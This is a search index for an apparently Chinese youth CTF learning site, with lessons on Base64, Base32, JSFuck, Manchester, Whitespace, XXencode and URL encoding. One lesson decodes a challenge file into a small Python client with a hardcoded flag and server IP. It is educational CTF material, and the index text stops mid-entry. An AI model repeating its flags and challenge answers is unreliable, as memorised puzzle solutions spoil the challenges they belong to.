{"config":{"lang":["en"],"separator":"[\\s\\u200b\\u3000\\-\u3001\u3002\uff0c\uff0e\uff1f\uff01\uff1b]+","pipeline":["stemmer"],"fields":{"title":{"boost":1000.0},"text":{"boost":1.0},"tags":{"boost":1000000.0}}},"docs":[{"location":"about/","title":"\u5173\u4e8e\u9752\u5c11\u5e74CTF\u7ec3\u4e60\u5e73\u53f0","text":""},{"location":"about/#\u5173\u4e8e\u6211\u4eec","title":"\u5173\u4e8e\u6211\u4eec","text":"<p>\u6211\u4eec\u662f\u4e00\u4e2a\u9762\u5411\u5168\u56fd\u9752\u5c11\u5e74\u7684CTF\u5e73\u53f0\uff0c\u662f\u514d\u8d39\u4e14\u516c\u76ca\u7684\u3002\u6211\u4eec\u62e5\u6709\u9752\u5c11\u5e74CTF\u8bad\u7ec3\u5e73\u53f0\u3001\u9752\u5c11\u5e74CTF\u5728\u7ebf\u5de5\u5177\u3001\u9752\u5c11\u5e74CTF\u8bba\u575b\u548c\u60a8\u6b63\u5728\u8bbf\u95ee\u7684\u9752\u5c11\u5e74CTF\u4f18\u79c0\u6587\u5e93\u3002</p>"},{"location":"about/#\u8054\u7cfb\u6211\u4eec","title":"\u8054\u7cfb\u6211\u4eec","text":"QQBilibili <p>QQ\u7fa42\u7fa4\uff08\u4e3b\u8981\uff09  QQ\u7fa41\u7fa4\uff08\u5df2\u6ee1\uff09 </p> <p>\u54d4\u54e9\u54d4\u54e9 </p>"},{"location":"home/","title":"\u6b22\u8fce\u6765\u5230\u9752\u5c11\u5e74CTF\u6587\u5e93","text":""},{"location":"home/#\u524d\u8a00","title":"\u524d\u8a00","text":"<p>\u9752\u5c11\u5e74CTF\u6587\u5e93\u65e8\u5728\u4e3a\u6b63\u5728\u5b66\u4e60\u7f51\u7edc\u5b89\u5168\u3001\u70ed\u7231\u4fe1\u606f\u653b\u9632\u3001\u51c6\u5907\u53c2\u52a0 CTF \u7ade\u8d5b\u7684\u4f60\uff0c\u63d0\u4f9b\u4e00\u4e2a \u7ed3\u6784\u5316\u3001\u7cfb\u7edf\u5316\u3001\u6613\u7406\u89e3\u3001\u53ef\u5b9e\u6218 \u7684\u77e5\u8bc6\u5e93\u3002  </p> <p>Tips</p> <p>\u65e0\u8bba\u4f60\u662f\u521a\u521a\u63a5\u89e6\u4fe1\u606f\u5b89\u5168\u7684\u201c\u5c0f\u767d\u201d\uff0c\u8fd8\u662f\u51c6\u5907\u6df1\u5165\u67d0\u4e2a\u65b9\u5411\u7684\u8fdb\u9636\u9009\u624b\uff0c\u90fd\u53ef\u4ee5\u5728\u8fd9\u91cc\u627e\u5230\u5c5e\u4e8e\u4f60\u7684\u5b66\u4e60\u8def\u5f84\u3002</p> <p>\u6587\u5e93\u4f1a\u6301\u7eed\u66f4\u65b0\u6700\u524d\u6cbf\u3001\u6700\u5e38\u7528\u7684 CTF \u77e5\u8bc6\u4f53\u7cfb\uff0c\u5305\u62ec\uff1a</p> <ul> <li>Misc\u3001Crypto\u3001Web\u3001Reverse\u3001Pwn\u7684\u57fa\u7840\u77e5\u8bc6\u3001\u8003\u5bdf\u70b9</li> <li>Web \u5b89\u5168\u57fa\u7840\u4e0e\u5e38\u89c1\u6f0f\u6d1e\u62c6\u89e3  </li> <li>\u5bc6\u7801\u5b66\u57fa\u7840\u4e0e\u4e13\u9898\u96be\u70b9\u89e3\u6790  </li> <li>Pwn \u4e0e\u4e8c\u8fdb\u5236\u5229\u7528\u7684\u73af\u5883\u3001\u601d\u8def\u4e0e\u6280\u5de7  </li> <li>\u9006\u5411\u5de5\u7a0b\u7684\u5de5\u5177\u3001\u6d41\u7a0b\u4e0e\u9898\u76ee\u62c6\u89e3  </li> <li>Misc \u6742\u9879\u65b9\u5411\u7684\u6280\u5de7\u4e0e\u5178\u578b\u9898\u578b  </li> <li>CTF \u5b9e\u6218\u7ecf\u9a8c\u3001\u56e2\u961f\u534f\u4f5c\u4e0e\u6bd4\u8d5b\u5fc3\u6001  </li> <li>\u5728\u7ebf\u5de5\u5177\u3001\u901a\u7528\u547d\u4ee4\u3001\u9776\u573a\u4e0e\u5b9e\u6218\u73af\u5883  </li> </ul> <p>\u6b22\u8fce\u4f60\u5c06\u8fd9\u91cc\u4f5c\u4e3a\u4f60\u7684 \u7f51\u7edc\u5b89\u5168\u5b66\u4e60\u4e3b\u57fa\u5730\u3002</p> <p>\u5185\u5bb9\u66f4\u65b0\u63d0\u793a</p> <p>\u672c\u6587\u5e93\u6b63\u5728\u8fdb\u884c\u7ed3\u6784\u5316\u91cd\u5199\u4e0e\u5185\u5bb9\u8fed\u4ee3\u3002 \u4f60\u5f53\u524d\u770b\u5230\u7684\u90e8\u5206\u7ae0\u8282\u53ef\u80fd\u5c5e\u4e8e\u65e9\u671f\u7248\u672c\uff0c\u5c1a\u672a\u66f4\u65b0\u81f3\u6700\u65b0\u5185\u5bb9\u3002</p> <p>\u6211\u4eec\u6b63\u5728\u6301\u7eed\u6574\u7406\uff1a</p> <ul> <li>\u66f4\u7edf\u4e00\u7684\u77e5\u8bc6\u7ed3\u6784  </li> <li>\u66f4\u8be6\u7ec6\u7684\u9898\u76ee\u62c6\u89e3  </li> <li>\u66f4\u89c4\u8303\u7684\u793a\u4f8b\u4ee3\u7801  </li> <li>\u66f4\u6807\u51c6\u7684\u8bed\u6cd5\u4e0e\u5b9e\u9a8c\u73af\u5883  </li> <li>\u66f4\u9002\u5408\u9752\u5c11\u5e74\u5b66\u4e60\u7684\u5185\u5bb9\u98ce\u683c  </li> </ul> <p>\ud83d\udea7 \u5f53\u6587\u5e93\u6574\u4f53\u5185\u5bb9\u5b8c\u5584\u5230\u4e00\u5b9a\u7a0b\u5ea6\u540e\uff0c\u672c\u63d0\u793a\u5c06\u4f1a\u79fb\u9664\u3002</p>"},{"location":"home/#\u63a5\u4e0b\u6765\u4f60\u53ef\u4ee5\u505a\u4ec0\u4e48","title":"\u63a5\u4e0b\u6765\u4f60\u53ef\u4ee5\u505a\u4ec0\u4e48\uff1f","text":"<p>\ud83d\udc49 \u5982\u679c\u4f60\u662f\u7b2c\u4e00\u6b21\u5b66\u4e60 CTF\uff1a\u4ece\u57fa\u7840\u77e5\u8bc6 \u5f00\u59cb\u5427\u3002 \ud83d\udc49 \u5982\u679c\u4f60\u5df2\u7ecf\u6709\u76ee\u6807\u65b9\u5411\uff1a\u9009\u62e9\u4f60\u611f\u5174\u8da3\u7684\u5206\u7c7b\u7ee7\u7eed\u6df1\u5165\u5b66\u4e60\u3002 \ud83d\udc49 \u5982\u679c\u4f60\u60f3\u53c2\u4e0e\u793e\u533a\uff1a\u52a0\u5165 QQ \u7fa4 / B \u7ad9\u5173\u6ce8\uff0c\u83b7\u53d6\u6700\u65b0\u8d44\u8baf\u4e0e\u66f4\u65b0\u3002  </p> <p>\u795d\u4f60\u5b66\u4e60\u6109\u5feb\uff01 \u6b22\u8fce\u6765\u5230\u5c5e\u4e8e\u4f60\u7684\u4e16\u754c\u2728</p>"},{"location":"Code/","title":"\u7f16\u7a0b","text":"<p>\u4f5c\u8005\u6b63\u5728\u7f16\u5199\u4e2d</p>"},{"location":"Crypto/","title":"\u4ecb\u7ecd","text":"<p>\u4f5c\u8005\u6b63\u5728\u7f16\u5199\u4e2d</p>"},{"location":"Crypto/Chapter1/1-1/","title":"Base64","text":""},{"location":"Crypto/Chapter1/1-1/#base64","title":"Base64","text":"<p>\u6b65\u9aa4 1\uff1a\u5c06\u6570\u636e\u6309 3 \u5b57\u8282\u5206\u7ec4</p> <ul> <li>\u4e8c\u8fdb\u5236\u6570\u636e\u6309\u6bcf 3 \u5b57\u8282\uff0824 \u4f4d\uff09\u4e3a\u4e00\u7ec4\u62c6\u5206   \u4f8b\u5982\uff1a\u5b57\u7b26\u4e32 <code>\"Man\"</code> \u7684 ASCII \u7801\u4e3a <code>0x4D 0x61 0x6E</code></li> </ul> <p>\u6b65\u9aa4 2\uff1a\u5c06 24 \u4f4d\u62c6\u5206\u4e3a 4 \u4e2a 6 \u4f4d\u5757</p> <ul> <li>3 \u5b57\u8282\uff0824 \u4f4d\uff09 \u2192 \u5206\u5272\u4e3a 4 \u4e2a 6 \u4f4d\u5757   \u793a\u4f8b\uff1a   <code>0x4D (01001101)</code> + <code>0x61 (01100001)</code> + <code>0x6E (01101110)</code>   \u5408\u5e76\u4e3a 24 \u4f4d\uff1a<code>010011 010110 000101 101110</code>   \u5bf9\u5e94 4 \u4e2a 6 \u4f4d\u503c\uff1a<code>19</code>\u3001<code>22</code>\u3001<code>5</code>\u3001<code>46</code></li> </ul> <p>\u6b65\u9aa4 3\uff1a\u5c06 6 \u4f4d\u503c\u6620\u5c04\u5230 Base64 \u5b57\u7b26\u8868</p> <ul> <li>\u67e5\u8868\uff08\u7d22\u5f15 0~63 \u5bf9\u5e94 <code>A-Z,a-z,0-9,+,/</code>\uff09\uff1a   <code>19\u2192T</code>\u3001<code>22\u2192W</code>\u3001<code>5\u2192F</code>\u3001<code>46\u2192u</code>   \u7ed3\u679c\uff1a<code>\"TWFu\"</code></li> </ul> <p>\u6b65\u9aa4 4\uff1a\u5904\u7406\u4e0d\u8db3 3 \u5b57\u8282\u7684\u60c5\u51b5</p> <ul> <li>\u60c5\u51b5 1\uff1a\u5269\u4f59 1 \u5b57\u8282\uff088 \u4f4d\uff09</li> <li>\u8865 4 \u4e2a <code>0</code> \u4f4d \u2192 \u751f\u6210 2 \u4e2a 6 \u4f4d\u5757\uff0c\u540e\u8865 <code>==</code>     \u4f8b\u5982\uff1a<code>\"A\"</code>\uff08<code>0x41</code>\uff09\u2192 <code>010000 010000</code> \u2192 <code>\"QQ==\"</code></li> <li>\u60c5\u51b5 2\uff1a\u5269\u4f59 2 \u5b57\u8282\uff0816 \u4f4d\uff09</li> <li>\u8865 2 \u4e2a <code>0</code> \u4f4d \u2192 \u751f\u6210 3 \u4e2a 6 \u4f4d\u5757\uff0c\u540e\u8865 <code>=</code>     \u4f8b\u5982\uff1a<code>\"BC\"</code>\uff08<code>0x42 0x43</code>\uff09\u2192 <code>010000 100100 001100</code> \u2192 <code>\"QkM=\"</code></li> </ul> <p>Base64 \u89e3\u7801\u6b65\u9aa4</p> <ol> <li>\u79fb\u9664\u586b\u5145\u7684 <code>=</code>\uff0c\u8ba1\u7b97\u6709\u6548\u5b57\u7b26\u6570</li> <li>\u6bcf\u4e2a\u5b57\u7b26\u67e5\u8868\u8f6c\u6362\u4e3a 6 \u4f4d\u4e8c\u8fdb\u5236</li> <li>\u5408\u5e76\u6240\u6709 6 \u4f4d\u5757\uff0c\u6309 8 \u4f4d\u5206\u7ec4\u6062\u590d\u539f\u59cb\u6570\u636e</li> </ol> <p>Base64 \u7f16\u7801\u7279\u70b9\uff1a</p> <pre><code>\u7531 A-Za-z0-9+/= \u7ec4\u6210\u7684 64 \u4e2a\u5b57\u7b26\uff0c\u901a\u5e38\u672b\u5c3e\u6709 == \u7684\u5c31\u662f Base64\n</code></pre> <p></p> <pre><code>flag{THE_FLAG_OF_THIS_STRING}\n</code></pre>"},{"location":"Crypto/Chapter1/1-10/","title":"Base32","text":""},{"location":"Crypto/Chapter1/1-10/#base32","title":"Base32","text":"<p>Base32 \u7f16\u7801\u5c06\u6bcf 5 \u4e2a\u4e8c\u8fdb\u5236\u4f4d\u8f6c\u6362\u4e3a 1 \u4e2a\u5b57\u7b26\uff08\u800c Base64 \u662f\u6bcf 6 \u4e2a\u4e8c\u8fdb\u5236\u4f4d\u8f6c\u6362\u4e3a 1 \u4e2a\u5b57\u7b26\uff09</p> <p>\u7531\u4e8e\u6bcf\u4e2a\u5b57\u7b26\u5360 5 \u4f4d\uff0c\u6240\u4ee5\u6700\u7ec8\u7684\u7f16\u7801\u5b57\u7b26\u4e32\u5c06\u6bd4\u539f\u59cb\u6570\u636e\u957f\u7ea6 60%\uff08\u76f8\u6bd4 Base64 \u7684 33%\uff09</p> <p>Base32 \u7f16\u7801\u4f7f\u7528\u7684\u5b57\u7b26\u96c6\u901a\u5e38\u5305\u62ec\uff1a</p> <pre><code>ABCDEFGHIJKLMNOPQRSTUVWXYZ234567\n</code></pre> <p>\u8fd9\u4e9b\u5b57\u7b26\u5305\u542b\u4e86\u5927\u5199\u5b57\u6bcd A \u5230 Z \u4ee5\u53ca\u6570\u5b57 2 \u5230 7\uff0c\u603b\u5171 32 \u4e2a\u5b57\u7b26</p> <p>Base32 \u7279\u70b9\uff1a</p> <pre><code>\u7531 A-Z \u548c 2-7 \u7ec4\u6210\u7684 32 \u4e2a\u5b57\u7b26\n</code></pre> <p></p>"},{"location":"Crypto/Chapter1/1-11/","title":"JSFuck","text":""},{"location":"Crypto/Chapter1/1-11/#jsfuck","title":"JSFuck","text":"<p>\u901a\u8fc7\u7279\u5b9a\u7684\u8fd0\u7b97\u7b26\u7ec4\u5408\uff08\u4f8b\u5982 <code>[</code>, <code>]</code>, <code>!</code>, <code>+</code>, <code>(</code>, <code>)</code>\uff09\u53ef\u4ee5\u6784\u9020\u51fa JavaScript \u4e2d\u7684\u5b57\u7b26\u4e32\u3001\u6570\u5b57\u548c\u5176\u4ed6\u57fa\u7840\u7c7b\u578b\u7684\u503c</p> <p>\u6700\u91cd\u8981\u7684\u662f\uff0cJSFuck \u662f\u57fa\u4e8e JavaScript \u7684 truthy \u548c falsy \u673a\u5236\u4ee5\u53ca \u5bf9\u8c61\u539f\u578b\u94fe \u7684\u5947\u7279\u884c\u4e3a\u6765\u5de5\u4f5c\u7684</p> <p>JSFuck \u6838\u5fc3\u673a\u5236</p> <pre><code>[]: \u7a7a\u6570\u7ec4\uff0c\u5b83\u5728 JavaScript \u4e2d\u662f\u4e00\u4e2a\u5bf9\u8c61\uff0c\u53ef\u4ee5\u7528\u6765\u6784\u9020\u6570\u5b57\u3001\u5b57\u7b26\u4e32\u548c\u5e03\u5c14\u503c\n!: \u903b\u8f91\u975e\u64cd\u4f5c\u7b26\uff0c\u53ef\u4ee5\u5c06 [] \u8f6c\u6362\u4e3a\u5e03\u5c14\u503c false \u6216 true\n+: \u52a0\u6cd5\u64cd\u4f5c\u7b26\uff0c\u53ef\u4ee5\u7528\u6765\u8fdb\u884c\u6570\u5b57\u7684\u8fd0\u7b97\u548c\u5b57\u7b26\u4e32\u7684\u62fc\u63a5\n(): \u7528\u4e8e\u6784\u9020\u51fd\u6570\u8c03\u7528\u6216\u521b\u5efa\u5bf9\u8c61\n[] \u548c () \u7684\u7ec4\u5408: \u53ef\u4ee5\u7528\u6765\u521b\u5efa\u4e0d\u540c\u7684 JavaScript \u7c7b\u578b\u6216\u8c03\u7528\u65b9\u6cd5\n</code></pre> <p>JSFuck \u52a0\u5bc6\u7279\u70b9\uff1a</p> <pre><code>[]()!+\u7ec4\u6210\n</code></pre> <p></p>"},{"location":"Crypto/Chapter1/1-12/","title":"\u66fc\u5f7b\u65af\u7279","text":""},{"location":"Crypto/Chapter1/1-12/#\u66fc\u5f7b\u65af\u7279","title":"\u66fc\u5f7b\u65af\u7279","text":"<p>\u5b83\u5728\u4ee5\u592a\u7f51\u5a92\u4ecb\u7cfb\u7edf\u4e2d\u7684\u5e94\u7528\u5c5e\u4e8e\u6570\u636e\u901a\u4fe1\u4e2d\u7684\u4e24\u79cd\u4f4d\u540c\u6b65\u65b9\u6cd5\u91cc\u7684\u81ea\u540c\u6b65\u6cd5\uff08\u53e6\u4e00\u79cd\u662f\u5916\u540c\u6b65\u6cd5\uff09\uff0c\u5373\u63a5\u6536\u65b9\u5229\u7528\u5305\u542b\u6709\u540c\u6b65\u4fe1\u53f7\u7684\u7279\u6b8a\u7f16\u7801\u4ece\u4fe1\u53f7\u81ea\u8eab\u63d0\u53d6\u540c\u6b65\u4fe1\u53f7\u6765\u9501\u5b9a\u81ea\u5df1\u7684\u65f6\u949f\u8109\u51b2\u9891\u7387\uff0c\u8fbe\u5230\u540c\u6b65\u76ee\u7684</p> <p>IEEE 802.4\uff08\u4ee4\u724c\u603b\u7ebf\uff09\u548c\u4f4e\u901f\u7248\u7684 IEEE 802.3\uff08\u4ee5\u592a\u7f51\uff09\u4e2d\u89c4\u5b9a, \u6309\u7167\u8fd9\u6837\u7684\u8bf4\u6cd5\uff1a</p> <p>01 \u7535\u5e73\u8df3\u53d8\u8868\u793a 1, 10 \u7684\u7535\u5e73\u8df3\u53d8\u8868\u793a 0</p> <pre><code>def iee(cipher):\n    \"\"\"\n    \u5bf9\u8f93\u5165\u7684\u5341\u516d\u8fdb\u5236\u7f16\u7801\u5b57\u7b26\u4e32\u8fdb\u884c\u89e3\u7801\uff0c\u8f93\u51fa\u8f6c\u6362\u540e\u7684\u7ed3\u679c\u3002\n    \"\"\"\n    binary_str = ''\n\n    # \u5c06\u6bcf\u4e2a\u5341\u516d\u8fdb\u5236\u5b57\u7b26\u5904\u7406\u4e3a\u4e8c\u8fdb\u5236\uff0c\u5e76\u63d0\u53d6\u5176\u4e2d\u7684\u7b2c 2 \u4f4d\u548c\u7b2c 4 \u4f4d\n    for char in cipher:\n        # \u5c06\u5341\u516d\u8fdb\u5236\u5b57\u7b26\u8f6c\u4e3a\u6574\u6570\uff0c\u7136\u540e\u8f6c\u6362\u4e3a\u4e8c\u8fdb\u5236\u5b57\u7b26\u4e32\uff0c\u586b\u5145\u5230 4 \u4f4d\n        binary = bin(int(char, 16))[2:].zfill(4)\n\n        # \u63d0\u53d6\u7b2c 2 \u4f4d\u548c\u7b2c 4 \u4f4d\uff08\u4ece 0 \u5f00\u59cb\u7d22\u5f15\uff09\n        binary_str += binary[1] + binary[3]\n\n    # \u5c06\u4e8c\u8fdb\u5236\u5b57\u7b26\u4e32\u5206\u6210 8 \u4f4d\u4e00\u7ec4\uff0c\u53cd\u8f6c\u6bcf\u7ec4\u5e76\u8f6c\u6362\u56de\u5341\u516d\u8fdb\u5236\n    plain = [\n        hex(int(binary_str[i:i + 8][::-1], 2))[2:].upper()\n        for i in range(0, len(binary_str), 8)\n    ]\n\n    # \u8f93\u51fa\u7ed3\u679c\n    print(''.join(plain))\n\n\ndef main():\n    cipher = '5555555595555A65556AA696AA6666666955'\n\n    iee(cipher)\n\n\nif __name__ == '__main__':\n    main()\n</code></pre> <p></p>"},{"location":"Crypto/Chapter1/1-13/","title":"WhiteSpace","text":""},{"location":"Crypto/Chapter1/1-13/#whitespace","title":"WhiteSpace","text":"<p>\u5728 Whitespace \u7f16\u7801\u4e2d\uff0c\u53ea\u6709\u4e09\u79cd\u7c7b\u578b\u7684\u5b57\u7b26\u88ab\u7528\u6765\u8868\u793a\u6570\u636e\uff1a</p> <pre><code>\u7a7a\u683c ( ): \u7528\u6765\u8868\u793a\u4e8c\u8fdb\u5236\u4e2d\u7684 0\n\u5236\u8868\u7b26 (\\t): \u7528\u6765\u8868\u793a\u4e8c\u8fdb\u5236\u4e2d\u7684 1\n\u6362\u884c\u7b26 (\\n): \u7528\u6765\u8868\u793a\u5206\u9694\u7b26\uff0c\u5373\u7528\u6765\u8868\u793a\u4e00\u4e2a\u6570\u636e\u5355\u5143\u7684\u7ed3\u675f\n</code></pre> <p>Whitespace \u7f16\u7801\u7279\u70b9\uff1a</p> <pre><code>\u6b63\u5e38\u6253\u5f00\u6ca1\u6709\u5185\u5bb9\u663e\u793a\uff0c\u5168\u9009\u5374\u6709\u4e1c\u897f\n</code></pre> <p></p>"},{"location":"Crypto/Chapter1/1-14/","title":"\u865a\u5047\u7535\u5b50\u8868\u683c","text":""},{"location":"Crypto/Chapter1/1-14/#\u865a\u5047\u7535\u5b50\u8868\u683c","title":"\u865a\u5047\u7535\u5b50\u8868\u683c","text":"<pre><code>csv \u5f62\u5f0f\u7684\u8d26\u5355\u8868\u683c\n</code></pre> <p>\u89e3\u7801\u7f51\u5740\uff1aspammimic.com</p> <p></p> <p>\u89e3\u7801\u62ff\u5230 flag</p> <p></p>"},{"location":"Crypto/Chapter1/1-15/","title":"XXencode","text":""},{"location":"Crypto/Chapter1/1-15/#xxencoder","title":"XXencoder","text":"<p>\u6709\u4e00\u4e2a\u540d\u4e3a Multimode \u7684 OS X \u5e94\u7528\u7a0b\u5e8f\u53ef\u7528\u4e8e\u5c06\u97f3\u9891\u8f6c\u6362\u56de\u539f\u59cb\u4f20\u771f\u56fe\u50cf</p> <p>\u4f46\u5b83\u53ea\u63a5\u53d7 WAV \u6587\u4ef6\u4f5c\u4e3a\u8f93\u5165\uff0c\u6240\u4ee5\u6211\u9996\u5148\u8f6c\u6362 <code>similar.ogg</code> \u4e3a <code>similar.wav</code> \u4f7f\u7528 Audacity</p> <p></p> <p>\u6b63\u6587\u5982\u4e0b\uff1a</p> <pre><code>section 1 of 1 of file rfax_man\nbegin 644 rfax_man\nh5sg60BSxwp62+57aMLVTPK3i9b-t+5pGLKyPA-FxxuysvFs+BT8+o0dVsM24\nhcZHRaWYEHRBGFGtqk-cMV7oqqQRzbobGRB9Kwc-pTHzCDSSMJorR8d-pxdqd\nhLWpvQWRv-N33mFwEicqz+UFkDYsbDvrfOC7tko5g1JrrSX0swhn64neLsohr\nh26K1mSxnS+TF1Cta8GHHQ-t1Cfp7nh-oZeFuVi5MEynqyzX8kMtXcAynSLQx\nhg4o56Pu4YUZHMqDGtczKeCwXU8PZEc4lY0FbDfFfgZpJFC-a-sHGLtGJgCMZ\nhksr6XNTedEUdVJqxOO5VaReoH68eEPJ2m6d9mKhlhVE7zw4Yru4DUWRCJH28\nhyeth+l2I0gPnEfrTLwAc+-TPS0YKYY3K0np58gVPgdAN8RY7+rQfRDin9JSa\nhPG32WG7-rTl3uthvrnDO-wD09GDIRCniuoefs8UsfiWZOLq+0awOrQxAPM+C\nhxLwOJ9VUKwdn7dJduLn1KhBucvL1pr5lGiBFfUbL79cFFex+G27kT+fsQ7X5\nh87mgPivWhDSQHKPXqpKGniDkYsIYpg66ZWbHp4PfcgtPukElDWENlQPSuNAQ\nhnboE4Bd8kyyokt67GgfGvBVS45sMFPtlgKRlG-QPFSgbMHujA3qYemxnuqGx\nhp97aXpdKpvAE8zx-oUzazoVFz32X3OxAuiWJhKEjaYKpM7f95yv1S62v+k++\n+\nend\nsum \u2014r/size 7468/769 section (from \"begin\" to \"end\")\nsum \u2014r/size 36513/540 entire input file\n</code></pre> <p>XXencoder \u662f\u4e00\u79cd\u5c06\u4e8c\u8fdb\u5236\u6570\u636e\u8f6c\u6362\u4e3a\u6587\u672c\u683c\u5f0f\u7684\u7f16\u7801\u65b9\u6cd5\uff0c\u7c7b\u4f3c\u4e8eUUencode\uff0c\u4f46\u4ec5\u4f7f\u7528\u5b57\u6bcd\u3001\u6570\u5b57\u3001\u52a0\u53f7\u548c\u51cf\u53f7\u7b49\u53ef\u6253\u5370\u5b57\u7b26</p> <p>\u7f16\u7801\u8fc7\u7a0b\uff1a</p> <ol> <li>\u5206\u7ec4\uff1a\u5c06\u8f93\u5165\u6570\u636e\u6bcf\u4e09\u4e2a\u5b57\u8282\u5206\u4e3a\u4e00\u7ec4\uff0c\u5982\u679c\u5269\u4f59\u5b57\u8282\u4e0d\u8db3\u4e09\u5b57\u8282\uff0c\u5219\u7528\u96f6\u586b\u5145</li> <li>\u4f4d\u5212\u5206\uff1a\u6bcf\u7ec4 24 \u4f4d\u88ab\u5212\u5206\u4e3a\u56db\u4e2a 6 \u4f4d\u7684\u5355\u5143\uff0c\u6bcf\u4e2a\u5355\u5143\u7684\u503c\u8303\u56f4\u5728 0 \u5230 63 \u4e4b\u95f4</li> <li>\u8f93\u51fa\u683c\u5f0f\uff1a\u6bcf\u884c\u8f93\u51fa 60 \u4e2a\u5b57\u7b26\uff08\u5bf9\u5e94 45 \u4e2a\u8f93\u5165\u5b57\u8282\uff09</li> <li>\u6587\u4ef6\u7ed3\u6784\uff1a\u7f16\u7801\u6570\u636e\u4ee5 <code>begin &lt;mode&gt; &lt;filename&gt;</code> \u5f00\u59cb\uff0c<code>end</code>\u7ed3\u675f</li> <li>\u5b57\u7b26\u6620\u5c04\uff1a\u6839\u636e\u6bcf\u4e2a 6 \u4f4d\u5355\u5143\u7684\u503c\uff0c\u6620\u5c04\u5230\u4ee5\u4e0b\u5b57\u7b26\u96c6\uff1a</li> </ol> <pre><code>+-0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\n</code></pre> <p>\u4f7f\u7528 XXdecoder \u89e3\u7801\u751f\u6210\u4e00\u4e2a\u540d\u4e3a \u7684\u6587\u4ef6 <code>rfax_man</code></p> <p></p> <pre><code>$ file rfax_man\nrfax_man: gzip compressed data, was \"rfax_man.py\", from FAT filesystem (MS-DOS, OS/2, NT), last modified: Thu Feb  6 17:52:39 2014, max speed\n</code></pre> <p>\u89e3\u538b\u7f29\u662f\u4e00\u4e2a Python \u811a\u672c</p> <pre><code>import socket,os,sys,hashlib\n\nKEY  = \"CTF{4BDF4498E4922B88642D4915C528DA8F}\" # DO NOT SHARE THIS!\nHOST = '109.233.61.11'\nPORT = 8001\n\nif len(sys.argv)&lt;3:\n  print 'Usage: rfax_man.py add|del file.png'\n  print '\\nAdd your pictures to transmission!\\nSizes: 800&lt;=width&lt;=3200 and height/width &lt;= 2.0.\\nUse contrast grayscale pictures.'\n  sys.exit(0)\n\ndata=open(sys.argv[2],'rb').read(1000000)\n\nm=hashlib.md5(); m.update(KEY); KEYH=m.hexdigest().upper()\nm=hashlib.md5(); m.update(data); h=m.hexdigest().upper()\nprint 'File hash',h\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect((HOST, PORT))\nprint 'Connected.'\n\nif sys.argv[1]=='add':\n  s.sendall(KEYH+':ADD:'+data)\n  s.shutdown(socket.SHUT_WR)\n  print s.recv(1024)\nelif sys.argv[1]=='del':\n  s.sendall(KEYH+':DEL:'+h)\n  print s.recv(1024)\n\ns.close()\nprint 'Done.'\n</code></pre>"},{"location":"Crypto/Chapter1/1-16/","title":"\u5783\u573e\u7535\u5b50\u90ae\u4ef6","text":""},{"location":"Crypto/Chapter1/1-16/#\u5783\u573e\u7535\u5b50\u90ae\u4ef6","title":"\u5783\u573e\u7535\u5b50\u90ae\u4ef6","text":"<p>\u63d0\u793a\u4e86\u5783\u573e\u90ae\u4ef6\uff0c\u53bb\u8fd9\u4e2a\u7f51\u7ad9\u89e3\u5bc6</p> <p></p> <p>\u6210\u529f\u62ff\u5230 flag</p> <p></p>"},{"location":"Crypto/Chapter1/1-2/","title":"URL","text":""},{"location":"Crypto/Chapter1/1-2/#url","title":"URL","text":"<p>\u4f8b\u5982\uff0c\u7a7a\u683c\u5b57\u7b26\uff08\uff09\u5728 URL \u4e2d\u4f1a\u88ab\u7f16\u7801\u4e3a <code>%20</code></p> <p>\u5728 URL \u7f16\u7801\u4e2d\uff0c\u6bcf\u4e2a\u5b57\u7b26\u90fd\u7528 3 \u4e2a\u5b57\u7b26\u8868\u793a\uff1a</p> <pre><code>`%` \u8868\u793a\u8f6c\u4e49\u5f00\u59cb\n\u63a5\u4e0b\u6765\u7684\u4e24\u4f4d\u6570\u5b57\u662f\u8be5\u5b57\u7b26\u7684\u5341\u516d\u8fdb\u5236 ASCII \u503c\n</code></pre> <p>\u4f8b\u5982\uff1a</p> <pre><code>\u7a7a\u683c\u5b57\u7b26\uff08` `\uff09\u7684 ASCII \u503c\u662f 32\uff0c\u8f6c\u6362\u4e3a\u5341\u516d\u8fdb\u5236\u662f `20`\uff0c\u6240\u4ee5\u7a7a\u683c\u5728 URL \u4e2d\u7f16\u7801\u4e3a `%20`\n\u7279\u6b8a\u5b57\u7b26 `#` \u7684 ASCII \u503c\u662f 35\uff0c\u5341\u516d\u8fdb\u5236\u8868\u793a\u4e3a `23`\uff0c\u56e0\u6b64 `#` \u88ab\u7f16\u7801\u4e3a `%23`\n</code></pre> <p>URL \u7f16\u7801\u7279\u70b9\uff1a</p> <pre><code>\u6bcf\u4e2a\u5b57\u7b26\u4ee5 % \u5f00\u5934 + \u5341\u516d\u8fdb\u5236\n</code></pre> <p></p>"},{"location":"Crypto/Chapter1/1-3/","title":"Quoted-printable","text":""},{"location":"Crypto/Chapter1/1-3/#quoted-printable","title":"Quoted-printable","text":"<p>\u5176\u6838\u5fc3\u601d\u60f3\u662f\u5c06\u975e ASCII \u5b57\u7b26\u548c\u67d0\u4e9b\u7279\u6b8a\u5b57\u7b26\u8f6c\u6362\u4e3a\u7b49\u6548\u7684 ASCII \u5b57\u7b26\u8868\u793a\uff0c\u5e76\u4e14\u7528 <code>=</code> \u7b26\u53f7\u4f5c\u4e3a\u8f6c\u4e49\u7b26</p> <p>\u7f16\u7801\u89c4\u5219\uff1a</p> <pre><code>ASCII \u5b57\u7b26\uff08\u53ef\u6253\u5370\u5b57\u7b26\uff09\uff1a\u4f8b\u5982\u5b57\u6bcd\u3001\u6570\u5b57\u548c\u4e00\u4e9b\u5e38\u89c1\u7b26\u53f7\uff0c\u5728\u7f16\u7801\u540e\u4fdd\u6301\u4e0d\u53d8\n\n\u975e ASCII \u5b57\u7b26\uff1a\u8fd9\u4e9b\u5b57\u7b26\u4f7f\u7528 = \u7b26\u53f7\u540e\u8ddf\u4e24\u4f4d\u5341\u516d\u8fdb\u5236\u8868\u793a\uff1a\n    \u4f8b\u5982\uff0c\u5b57\u7b26 \u00e9\uff08ASCII \u7801 233\uff09\u88ab\u7f16\u7801\u4e3a =E9\n\n\u7279\u6b8a\u5b57\u7b26\uff08\u5982\u7a7a\u683c\u3001\u6362\u884c\u7b26\u7b49\uff09\uff1a\n    \u7a7a\u683c\uff08 \uff09\u5982\u679c\u4f4d\u4e8e\u884c\u5c3e\u4f1a\u88ab\u7f16\u7801\u4e3a =20\n    \u6362\u884c\u7b26\uff08\\n\uff09\u901a\u5e38\u88ab\u7f16\u7801\u4e3a =0A 